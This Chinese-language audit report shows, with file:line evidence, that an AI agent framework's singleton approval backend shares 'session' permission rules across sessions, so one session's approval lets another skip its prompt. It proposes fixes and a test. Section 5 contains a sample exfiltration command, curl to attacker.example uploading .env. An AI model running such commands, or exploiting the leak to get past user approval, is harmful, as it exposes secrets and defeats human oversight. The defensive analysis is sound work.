# N-06 验证：InteractiveApprovalBackend session rule 缓存作用域

## 1. 命题

可判真假的命题：

在当前生产交互路径中，用户在会话 A 的工具权限审批卡上选择“本会话一直允许/拒绝”（`ApprovalResult.always: true` 且 `scope: "session"`）后，`InteractiveApprovalBackend` 会把生成的 `PermissionRule` 写入该 backend 实例字段 `sessionAllowRules` / `sessionDenyRules`。默认 interactive backend 来自 `getInteractiveApprovalBackend()` 的进程级 singleton；这些 session rule 的读写不以 `ApprovalRequest.sessionId` 分桶。因此，同一进程内会话 B 对相同 operation 再触发 tool permission ask 时，可能命中会话 A 写入的 session rule，直接免审批允许或拒绝。

限定：这个命题只针对使用共享 `InteractiveApprovalBackend` 的交互式 host 路径；若调用方显式为每个 session 注入独立 backend，则不适用。它也不是 `pendingApprovals` 的 request/response 路由问题，而是用户审批结果被记录后的权限规则记忆作用域问题。

## 2. 验证方法

完整读链路：

- `InteractiveApprovalBackend`：构造字段、`requestApproval()`、`checkSessionRules()`、`promptAndRecord()`、`buildProjectRule()`、singleton getter/setter。
- `PermissionClassifier.handleAsk()`：如何把 `sessionId` 放进 `ApprovalRequest`。
- `ToolExecutor.executeSingle()`：如何从 `ToolContext.sessionId` 调用 `handleAsk()`。
- `Engine.run()` / `buildPermissionConfig()`：如何创建 `PermissionClassifier`、如何选择 interactive backend、如何把 session id 写入 `toolCtx`。
- `ChatSessionManager` / `ChatSession`：是否每 session 持有独立 backend，还是每 session 只有独立 Engine 和 pending map。
- `AgentServer`：`setInteractiveApprovalFn()`、`requestApprovalFromClient()`、`handleApprove()`、`requestAskUserForSession()`，用于对照 9ff46639 的 pending resolver 修复。
- 现有测试：`permission.session-cache.test.ts`、`server.askuser-session-isolation.test.ts`、`server.reload-settings.test.ts`。
- 对照实现：`path-policy.ts` 的 path session grant，确认同仓库里已有按 `sessionId` 分桶的 session-scope grant 模式。

关键 grep：

- `rg -n "sessionAllowRules|sessionDenyRules|checkSessionRules|promptAndRecord|promptTurn|getInteractiveApprovalBackend|_interactiveBackend|setInteractiveApprovalFn" packages/core/src/tool-system/permission.ts`
  - 命中 `packages/core/src/tool-system/permission.ts:142`、`:143`、`:159`、`:193`、`:209`、`:219`、`:230`、`:250`、`:500`、`:502`、`:512`。
- `rg -n "sessionId" packages/core/src/tool-system/permission.ts`
  - 只命中 `packages/core/src/tool-system/permission.ts:970`、`:1012`；命中点在 `PermissionClassifier.handleAsk()`，不是 `InteractiveApprovalBackend` 的 cache key。
- `rg -n "ApprovalRequest|sessionId\\?: string|ApprovalScope|always\\?|scope\\?|pathScope" packages/core/src/types.ts`
  - 命中 `packages/core/src/types.ts:339`、`:341`、`:355`、`:372`、`:373`、`:374`、`:377`。
- `rg -n "buildPermissionConfig|approvalBackend instanceof InteractiveApprovalBackend|getInteractiveApprovalBackend|new PermissionClassifier|toolCtx\\.sessionId|setContext\\(toolCtx\\)|permission\\.handleAsk" packages/core/src/engine/engine.ts packages/core/src/tool-system/executor.ts`
  - 命中 `packages/core/src/engine/engine.ts:1511`、`:1650`、`:1655`、`:1663`、`:1685`、`:3031`、`:3092`；`packages/core/src/tool-system/executor.ts:336`、`:419`。
- `rg -n "pendingApprovals|handleApprove|requestApprovalFromClient|requestAskUserForSession|cancelSessionApprovals|setInteractiveApprovalFn" packages/core/src/protocol/server.ts packages/core/src/protocol/chat-session.ts packages/core/src/protocol/server.askuser-session-isolation.test.ts`
  - 命中 `packages/core/src/protocol/chat-session.ts:50`；`packages/core/src/protocol/server.ts:149`、`:195`、`:652`、`:671`、`:682`、`:693`、`:1908`、`:1920`、`:1924`、`:1952`、`:1960`、`:1981`、`:2351`；测试命中 `packages/core/src/protocol/server.askuser-session-isolation.test.ts:107`、`:108`、`:109`、`:116`、`:128`、`:129`。
- `rg -n "scope: \"session\"|Session-level permission cache|requestApproval\\(|new InteractiveApprovalBackend" packages/core/src/tool-system/permission.session-cache.test.ts tests/permission.test.ts packages/core/src/protocol/server.askuser-session-isolation.test.ts`
  - 命中 `packages/core/src/tool-system/permission.session-cache.test.ts:2`、`:15`、`:26`、`:74`、`:111`、`:145`、`:170`、`:198`、`:217`、`:225`；这些都是单 backend 内 operation cache 测试，没有跨 `sessionId` 断言。
- `rg -n "sessionPathGrants|recordPathApproval|isPathPreApproved|openSessionPathApprovals|clearSessionPathApprovals|askChains" packages/core/src/tool-system/path-policy.ts packages/core/src/protocol/chat-session-manager.ts`
  - 命中 `packages/core/src/tool-system/path-policy.ts:174`、`:260`、`:267`、`:288`、`:300`、`:303`、`:365`、`:369`、`:610`、`:624`、`:630`、`:693`；`packages/core/src/protocol/chat-session-manager.ts:54`、`:102`。
- `git show --stat --patch 9ff46639 -- packages/core/src/protocol/server.ts packages/core/src/protocol/server.askuser-session-isolation.test.ts`
  - 确认该 commit 删除了 session-tagged approve 对 legacy server map 的 fallback，并新增 `server.askuser-session-isolation.test.ts`。

本轮未跑构建/测试，按要求只做源码阅读、grep、git show 和文档写入。

## 3. 证据

### 3.1 `ApprovalRequest.sessionId` 存在，但类型注释限定为 host UI 路由

- `packages/core/src/types.ts:339` 定义 `ApprovalRequest`。
- `packages/core/src/types.ts:340` 注释写明 `sessionId` 是 “Originating engine session. Hosts use this only to route the prompt UI.”。
- `packages/core/src/types.ts:341` 是 `sessionId?: string`。
- `packages/core/src/types.ts:349` 到 `packages/core/src/types.ts:355` 定义 `"session"` scope 的语义：本 REPL session 内存记忆。
- `packages/core/src/types.ts:368` 到 `packages/core/src/types.ts:377` 定义 `ApprovalResult`，允许 approved result 携带 `always`、`scope`、`pathScope`。

也就是说，数据结构有 `sessionId`，但当前注释已经暗示它只被 host 用于路由 prompt UI，不承诺被 backend cache 作为 key。

### 3.2 session rule 的存储结构没有 `sessionId` 维度

- `packages/core/src/tool-system/permission.ts:136` 定义 `InteractiveApprovalBackend`。
- `packages/core/src/tool-system/permission.ts:142` 是 `private sessionAllowRules: PermissionRule[] = []`。
- `packages/core/src/tool-system/permission.ts:143` 是 `private sessionDenyRules: PermissionRule[] = []`。
- `packages/core/src/tool-system/permission.ts:159` 是实例字段 `private promptTurn: Promise<void> = Promise.resolve()`。
- 同一实例上还挂着 `cwd`、`savedProjectRules`、`onProjectRules`：`packages/core/src/tool-system/permission.ts:145`、`:151`、`:152`。

这些字段都是 backend 实例字段。不存在 `Map<sessionId, PermissionRule[]>`，也不存在包含 `sessionId` 的复合 key。

### 3.3 读取路径：`requestApproval()` 先查实例级 session rules，未读 `req.sessionId`

- `packages/core/src/tool-system/permission.ts:191` 进入 `requestApproval(req)`。
- `packages/core/src/tool-system/permission.ts:193` 调 `this.checkSessionRules(req)`。
- `packages/core/src/tool-system/permission.ts:194` 命中 cache 直接返回。
- 并发串行后还会重新查一次：`packages/core/src/tool-system/permission.ts:204` 到 `packages/core/src/tool-system/permission.ts:211`。
- `packages/core/src/tool-system/permission.ts:219` 定义 `checkSessionRules(req)`。
- `packages/core/src/tool-system/permission.ts:220` 对 `this.sessionDenyRules.some(...)` 做匹配。
- `packages/core/src/tool-system/permission.ts:223` 对 `this.sessionAllowRules.some(...)` 做匹配。

`checkSessionRules()` 的匹配参数只有 `rule`、`req.toolName`、`req.args`，没有读取 `req.sessionId`。`rg -n "sessionId" packages/core/src/tool-system/permission.ts` 也只命中 `PermissionClassifier.handleAsk()` 的 opts 和构造 request 处：`packages/core/src/tool-system/permission.ts:970`、`:1012`，没有命中 `InteractiveApprovalBackend` 的 cache 读写逻辑。

### 3.4 写入路径：用户选择 session scope 后写入实例级数组，未按 session 分桶

- `packages/core/src/tool-system/permission.ts:230` 进入 `promptAndRecord(req)`。
- `packages/core/src/tool-system/permission.ts:234` 调 `promptFn(req)` 得到用户决定。
- `packages/core/src/tool-system/permission.ts:235` 把 `result.scope ?? (result.always ? "session" : "once")` 算成 scope。
- `packages/core/src/tool-system/permission.ts:244` 判断 `scope === "session" && result.always`。
- `packages/core/src/tool-system/permission.ts:248` 用 `buildProjectRule(req.toolName, req.args, ruleOpts)` 生成规则。
- `packages/core/src/tool-system/permission.ts:250` 按 approved/denied 选择 `this.sessionAllowRules` 或 `this.sessionDenyRules`。
- `packages/core/src/tool-system/permission.ts:258` `target.push(...)`。

写入只依赖 tool 和 args。`req.sessionId` 不参与生成 rule、不参与选择 target，也不参与去重。

项目 scope 也会 seed session allow：

- `packages/core/src/tool-system/permission.ts:261` 处理 `scope === "project" && result.approved`。
- `packages/core/src/tool-system/permission.ts:300` 到 `packages/core/src/tool-system/permission.ts:306` 把 project rule 也加入 `this.sessionAllowRules`，同样没有 session 分桶。

### 3.5 rule 本身按 operation 缩窄，但这是 operation 维度，不是 session 维度

- `packages/core/src/tool-system/permission.ts:351` 定义 `buildProjectRule()`。
- Bash rule 按 head command 缩窄：`packages/core/src/tool-system/permission.ts:356` 到 `packages/core/src/tool-system/permission.ts:365`，例如 `curl https://a` 会生成匹配 `^curl(\s|$)` 的 rule。
- Write/Edit 可按 pathScope 缩窄：`packages/core/src/tool-system/permission.ts:368` 到 `packages/core/src/tool-system/permission.ts:381`。
- 其它工具 fallback 为 tool-wide rule：`packages/core/src/tool-system/permission.ts:386` 到 `packages/core/src/tool-system/permission.ts:390`。
- `ruleMatches()` 有 Bash 链式/危险命令防护：`packages/core/src/tool-system/permission.ts:419` 到 `packages/core/src/tool-system/permission.ts:428`。这降低了同一 session 内的宽泛 Bash grant 风险，但仍没有 session 维度。

因此，当前 cache 确实不是“任何工具同名都放行”的旧式粗糙 cache；它已经有 operation 缩窄。但 N-06 关心的是 session 隔离，operation 缩窄不能防止会话 A 的同 operation grant 被会话 B 使用。

### 3.6 backend 生命周期：默认 interactive backend 是进程级 singleton

- `packages/core/src/tool-system/permission.ts:499` 注释写 “Singleton interactive backend for use by the UI”。
- `packages/core/src/tool-system/permission.ts:500` 定义模块级 `_interactiveBackend`。
- `packages/core/src/tool-system/permission.ts:502` 到 `packages/core/src/tool-system/permission.ts:506` 的 `getInteractiveApprovalBackend()` 懒创建并返回同一个实例。
- `packages/core/src/tool-system/permission.ts:509` 到 `packages/core/src/tool-system/permission.ts:512` 的 `setInteractiveApprovalFn()` 也是对 singleton 调 `setPromptFn()`。
- `packages/core/src/protocol/server.ts:195` 到 `packages/core/src/protocol/server.ts:197` 在 `AgentServer` 构造时安装 process-local prompt fn，底层就是上面的 singleton。

Engine 选择 backend 的默认路径：

- `packages/core/src/engine/engine.ts:3031` 定义 `buildPermissionConfig()`。
- `packages/core/src/engine/engine.ts:3077` 到 `packages/core/src/engine/engine.ts:3082` 只有显式 `config.approvalBackend` 时才用调用方传入的 backend。
- 否则 `packages/core/src/engine/engine.ts:3092` 取 `const interactive = getInteractiveApprovalBackend()`。
- `packages/core/src/engine/engine.ts:3093` 到 `packages/core/src/engine/engine.ts:3094` 在该 singleton 有 prompt fn 时直接 `backend = interactive`。
- `packages/core/src/engine/engine.ts:1655` 用选出的 backend 创建 `new PermissionClassifier(...)`。
- `packages/core/src/engine/engine.ts:1663` 到 `packages/core/src/engine/engine.ts:1670` 若 backend 是 interactive，就在同一 backend 实例上设置 `cwd` 和 `onProjectRules` callback。

Session 持有关系：

- `packages/core/src/protocol/chat-session-manager.ts:78` 为新 session 调 `this.factory(slice)` 创建 Engine。
- `packages/core/src/protocol/chat-session-manager.ts:79` 创建 `new ChatSession({ id: sessionId, engine })`。
- `packages/core/src/protocol/chat-session.ts:40` 到 `packages/core/src/protocol/chat-session.ts:50` 显示 `ChatSession` 持有 `engine` 和自己的 `pendingApprovals` map，但不持有独立 `InteractiveApprovalBackend`。

生产 host 对照：

- Desktop/stdio worker 的 session Engine factory 创建 `new Engine(...)`，见 `packages/core/src/cli/agent-server-stdio.ts:235` 到 `packages/core/src/cli/agent-server-stdio.ts:285`，没有传 per-session `approvalBackend`；因此在有 `AgentServer` prompt fn 时走 `buildPermissionConfig()` 的 singleton interactive backend。
- TCP server 同样创建 per-session Engine，见 `packages/core/src/cli/agent-server-tcp.ts:94` 到 `packages/core/src/cli/agent-server-tcp.ts:116`，也没有传 per-session interactive backend。
- TUI REPL 的 shared config 显式设置 `approvalBackend: getInteractiveApprovalBackend()`，见 `packages/tui/src/cli/commands/repl.ts:168`，再通过 `...sharedCfg` 传给 Engine factory，见 `packages/tui/src/cli/commands/repl.ts:204` 到 `packages/tui/src/cli/commands/repl.ts:210`。TUI REPL 当前主要是单 session，但代码事实仍是共享 singleton。

### 3.7 `sessionId` 确实被传到 approval request，但只用于 host pending 路由

- `packages/core/src/engine/engine.ts:1511` 把 `session.state.sessionId` 写入 `toolCtx.sessionId`。
- `packages/core/src/engine/engine.ts:1685` 把 `toolCtx` 注入 `ToolExecutor`。
- `packages/core/src/tool-system/executor.ts:419` 到 `packages/core/src/tool-system/executor.ts:420` 在 permission ask 时把 `this.toolCtx?.sessionId` 传给 `PermissionClassifier.handleAsk()`。
- `packages/core/src/tool-system/permission.ts:1011` 到 `packages/core/src/tool-system/permission.ts:1017` 把 `opts.sessionId` spread 到 `approvalBackend.requestApproval({ sessionId, toolName, args, ... })`。
- `packages/core/src/protocol/server.ts:1908` 到 `packages/core/src/protocol/server.ts:1912` 的 `requestApprovalFromClient()` 读取 `request.sessionId` 找对应 `ChatSession`。
- `packages/core/src/protocol/server.ts:1919` 到 `packages/core/src/protocol/server.ts:1924` 有 session 时写 `session.pendingApprovals`，否则才写 legacy `this.pendingApprovals`。
- `packages/core/src/protocol/server.ts:1937` 到 `packages/core/src/protocol/server.ts:1941` 发送 notification 时把 `sessionId` 放进 envelope。

所以 prompt 卡会路由到正确 session；问题发生在 prompt resolve 后，`InteractiveApprovalBackend` 把 “session” grant 记到了 singleton 实例数组。

### 3.8 对照：path-policy 的 session grant 已按 `sessionId` 分桶

这不是仓库整体没有 session grant 概念，而是 `InteractiveApprovalBackend` 这一层没有做到。

- `packages/core/src/tool-system/path-policy.ts:174` 是 `const sessionPathGrants = new Map<string, Set<PathGrant>>()`。
- `packages/core/src/tool-system/path-policy.ts:260` 到 `packages/core/src/tool-system/path-policy.ts:270` 的 `isPathPreApproved(..., sessionId?)` 用 `sessionPathGrants.get(sessionId)` 查询。
- `packages/core/src/tool-system/path-policy.ts:288` 到 `packages/core/src/tool-system/path-policy.ts:304` 的 `recordPathApproval(..., sessionId?)` 在 session scope 下写入 `sessionPathGrants.set(sessionId, s)`。
- `packages/core/src/tool-system/path-policy.ts:365` 到 `packages/core/src/tool-system/path-policy.ts:372` 提供 open/clear per-session path approvals。
- `packages/core/src/protocol/chat-session-manager.ts:54` 创建/复用 session 时 `openSessionPathApprovals(sessionId)`；`packages/core/src/protocol/chat-session-manager.ts:102` close 时 `clearSessionPathApprovals(sessionId)`。
- `packages/core/src/tool-system/path-policy.ts:623` 到 `packages/core/src/tool-system/path-policy.ts:630` 并发 ask 链也以 `ctx.sessionId ?? "__global__"` 为 key，并在轮到自己后按 `ctx.sessionId` 重新查 grant。

这说明 path approval 的 “session scope” 已按 sessionId 建模；tool permission session rule 没有同等隔离。

## 4. 与 9ff46639 的辨析

9ff46639 修的是 pending resolver 路由，不是权限规则缓存。

历史 commit 证据：

- `git show --stat 9ff46639` 显示 commit 标题为 `fix(core): isolate AskUserQuestion pending resolvers per-session to stop cross-session input misdelivery`，只改了 `packages/core/src/protocol/server.ts` 和新增 `packages/core/src/protocol/server.askuser-session-isolation.test.ts`。
- diff 中删除了 `handleApprove()` 在 session map 找不到 requestId 时 fallback 到 legacy `this.pendingApprovals` 的逻辑；当前代码保留了这个修复。

当前源码证据：

- `packages/core/src/protocol/chat-session.ts:50`：每个 `ChatSession` 有自己的 `pendingApprovals` map。
- `packages/core/src/protocol/server.ts:655` 到 `packages/core/src/protocol/server.ts:658` 注释明确：chatManager path 按 `(sessionId, requestId)` scoped，session-tagged response 不能 fallback 到 legacy global map。
- `packages/core/src/protocol/server.ts:671` 到 `packages/core/src/protocol/server.ts:688`：只查对应 session 的 `pendingApprovals`，找到后 delete+resolve。
- `packages/core/src/protocol/server.ts:692` 到 `packages/core/src/protocol/server.ts:708`：legacy path 独立，只在没有 chatManager session-tagged path 时使用 server 级 map。
- `packages/core/src/protocol/server.ts:1952` 到 `packages/core/src/protocol/server.ts:1981`：`AskUserQuestion` 的 chatManager path 写入指定 session 的 `pendingApprovals` 并在 notification 中带 `sessionId`。
- `packages/core/src/protocol/server.ts:2351` 到 `packages/core/src/protocol/server.ts:2363`：cancel/close drain 单个 session 的 pending approvals。

测试覆盖：

- `packages/core/src/protocol/server.askuser-session-isolation.test.ts:70` 的用例名是 “resolves an askUser answer only for the matching sessionId and requestId”。
- `packages/core/src/protocol/server.askuser-session-isolation.test.ts:107` 到 `packages/core/src/protocol/server.askuser-session-isolation.test.ts:109` 断言 A/B 两个 session 各有 1 个 pending，server legacy map 为 0。
- `packages/core/src/protocol/server.askuser-session-isolation.test.ts:111` 到 `packages/core/src/protocol/server.askuser-session-isolation.test.ts:129` 用 B 的 `sessionId` 去 resolve A 的 `requestId`，断言返回 `InvalidParams` 且 A/B pending 都还在。
- `packages/core/src/protocol/server.askuser-session-isolation.test.ts:131` 到 `packages/core/src/protocol/server.askuser-session-isolation.test.ts:159` 再分别用正确 `(sessionId, requestId)` resolve B 和 A。

结论：

- 9ff46639 已修的是“待决审批/提问的输入投递到哪个 pending resolver”。
- N-06 是“审批结果选择 session scope 后，记忆的 PermissionRule 属于哪个 session”。
- 两者不是同一层，也不是 9ff46639 的同层残留。9ff46639 的测试不能覆盖 N-06，因为它没有让 `InteractiveApprovalBackend` 记录 `scope: "session"` 的 rule，也没有检查会话 B 是否因会话 A 的 session rule 免审批。
- N-06 是独立于 9ff46639、当前仍存在的新层面隐患。

## 5. 结论与严重度

结论：确证。

命题中 “session rule cache 实际挂在 singleton backend 实例上、未按 `sessionId` 隔离” 被当前源码逐线支持。`ApprovalRequest.sessionId` 已从 Engine/Executor/Classifier 传到 backend request，但 `InteractiveApprovalBackend` 的 cache 读写完全不使用它。

严重度校准：P1 成立，但不需要上调 P0。

理由：

- 这是 permission boundary 的跨 session 泄漏。会话 B 可能绕过本应弹出的权限审批，直接继承会话 A 的 “本会话允许”。
- 影响范围受限于同一进程、同一 OS 用户、使用共享 interactive backend 的交互式 host；不是跨用户远程任意授权。
- operation cache 已有缩窄和 Bash 链式/危险命令防护，因此不是“允许一个 Bash 就允许所有 Bash”的最坏形态。
- 但对 `Bash` 的单条 `unsafe` head command 仍很宽。例如 `curl` 这类不是 safe-read/safe-write、会触发 ask 的命令，一旦 A session 选择 session allow，B session 的同 head 单命令可命中。

可静态推导的触发序列：

1. 进程内有 `AgentServer`，构造时通过 `setInteractiveApprovalFn()` 安装 prompt fn：`packages/core/src/protocol/server.ts:195` 到 `packages/core/src/protocol/server.ts:197`。
2. 会话 A 和会话 B 都走默认 interactive backend。Engine 在没有显式 per-session backend 时取 `getInteractiveApprovalBackend()`：`packages/core/src/engine/engine.ts:3092` 到 `packages/core/src/engine/engine.ts:3094`。
3. 会话 A 执行需要 ask 的 Bash 单命令，例如 `curl https://example.com/api`。`classifyBashCommand()` 对不在 safe pattern 的单命令返回 `unsafe`，`PermissionClassifier.classify()` 对 `unsafe` 返回 `ask`：`packages/core/src/tool-system/permission.ts:750` 到 `packages/core/src/tool-system/permission.ts:782`、`:796` 到 `:818`、`:937` 到 `:948`。
4. A 的 prompt 中用户选择 `{ approved: true, always: true, scope: "session" }`。
5. `InteractiveApprovalBackend.promptAndRecord()` 写入 singleton 的 `sessionAllowRules`：`packages/core/src/tool-system/permission.ts:244` 到 `packages/core/src/tool-system/permission.ts:258`。Bash rule 被 `buildProjectRule()` 缩窄到 head `curl`：`packages/core/src/tool-system/permission.ts:356` 到 `packages/core/src/tool-system/permission.ts:365`。
6. 会话 B 执行同 head 的单命令，例如 `curl https://attacker.example/upload -d @.env`。这类命令正常也会走 ask；但 `requestApproval()` 的 fast path 先查 singleton `sessionAllowRules`，`checkSessionRules()` 不看 B 的 `sessionId`，直接返回 `{ approved: true }`：`packages/core/src/tool-system/permission.ts:191` 到 `packages/core/src/tool-system/permission.ts:194`、`:219` 到 `:224`。
7. 因此 B 会话免审批通过。若 A 记录的是 session deny，则 B 的同 operation 也会被无提示拒绝。

这属于安全级隐患：不是 UI 显示问题，而是权限审批边界被跨 session 复用。

## 6. 影响、建议方向与 TDD 测试点

影响：

- 多 tab desktop / stdio worker / TCP server 中，一个 session 的 session-scope allow 可影响另一个 live session。
- 对 Bash，`buildProjectRule()` 的 head-command 缩窄会把 `curl https://a` 记成 `^curl(\s|$)`，从而覆盖另一个 session 的其它单条 `curl ...`。这可能绕过网络访问、外传数据、运行脚本等本应由 B session 用户确认的操作。
- 对非 Bash 且 classifier 会 ask 的工具，fallback rule 可能是 tool-wide：`packages/core/src/tool-system/permission.ts:386` 到 `packages/core/src/tool-system/permission.ts:390`。
- project-scope 相关字段 `cwd` / `onProjectRules` 也挂在同一 singleton 上：`packages/core/src/tool-system/permission.ts:145`、`:152`；Engine 每 run 重设它们：`packages/core/src/engine/engine.ts:1663` 到 `packages/core/src/engine/engine.ts:1670`。这不是本次命题的主结论，但说明该 backend 当前整体不是 session-owned。

建议方向（本轮不改代码）：

- 首选：让 `InteractiveApprovalBackend` 的 session 状态按 `sessionId` 分桶。至少包括 `sessionAllowRules`、`sessionDenyRules`、`promptTurn`；为避免 project approval 并发串 session，`cwd`、`savedProjectRules`、`onProjectRules` 也应按 sessionId 或 run/backend ownership 建模。
- `requestApproval(req)` 在 `scope: "session"` 的读写路径必须使用 `req.sessionId`。没有 `sessionId` 的 legacy path 不应共享到所有 session；可以使用显式 legacy bucket，或对无 sessionId 的 session-scope 只做一次性处理。
- `ChatSessionManager.close(sessionId)` 需要清理该 session 的 interactive permission buckets，类似 path-policy 的 `clearSessionPathApprovals(sessionId)`。
- 另一个可选方向是真正 per-session 创建 `InteractiveApprovalBackend`，但要同时保留 `AgentServer` prompt fn 的路由能力；否则 singleton promptFn 仍会把状态混在一起。

锁定行为的 TDD 测试点：

- 建议文件：`packages/core/src/tool-system/permission.session-cache.test.ts`。
- 现有覆盖：该文件当前验证 “同一 backend 内 operation cache 不要过宽” 和 “并发同 operation 去重”，见 `packages/core/src/tool-system/permission.session-cache.test.ts:24`、`:196`；没有跨 `sessionId` 用例。`server.askuser-session-isolation.test.ts` 覆盖 pending resolver 路由，不覆盖 rule cache。
- 新用例场景：同一个 `InteractiveApprovalBackend`，A session 先批准 `Bash curl https://a` 的 session allow；随后 B session 请求 `Bash curl https://b`，promptFn 对 B 返回 deny。正确行为应是 B 仍然被 prompt，且最终 denied。
- 断言：
  - `prompts === 2`，说明 B 没有命中 A 的 session cache。
  - B 的结果 `approved === false`，说明 B 的独立决定生效。
  - 可额外断言 promptFn 收到的第二个 `req.sessionId === "sess-b"`。

示例测试骨架：

```ts
test("session allow rules are isolated by ApprovalRequest.sessionId", async () => {
  const b = new InteractiveApprovalBackend();
  const seen: string[] = [];
  b.setPromptFn(async (req) => {
    seen.push(req.sessionId ?? "");
    if (req.sessionId === "sess-a") {
      return { approved: true, always: true, scope: "session" } as ApprovalResult;
    }
    return { approved: false } as ApprovalResult;
  });

  const a = await b.requestApproval({
    sessionId: "sess-a",
    toolName: "Bash",
    args: { command: "curl https://a.example" },
    description: "",
    riskLevel: "medium",
  });
  expect(a.approved).toBe(true);

  const bResult = await b.requestApproval({
    sessionId: "sess-b",
    toolName: "Bash",
    args: { command: "curl https://b.example" },
    description: "",
    riskLevel: "medium",
  });

  expect(seen).toEqual(["sess-a", "sess-b"]);
  expect(bResult.approved).toBe(false);
});
```

该测试在当前源码下会失败：第二次 request 会在 `checkSessionRules()` fast path 命中 A 写入的 `curl` allow rule，`seen` 仍只有 `["sess-a"]`，且 `bResult.approved` 会是 `true`。

## 7. 自查

- 明确结论：N-06 确证。
- 与 9ff46639 的关系：9ff46639 修复 pending resolver 输入路由；N-06 是审批结果的 session rule cache 作用域，属于独立新层面隐患。
- 严重度：P1 合理，安全级；不上调 P0，因其受同进程同用户和 operation 缩窄限制。
- 证据：所有关键结论均有当前源码 `file:line` 支撑；历史 commit 只作为辨析背景，不替代当前源码。
- 护栏：本轮只新增本文档，不改 `packages/**`，未跑构建，未 commit。
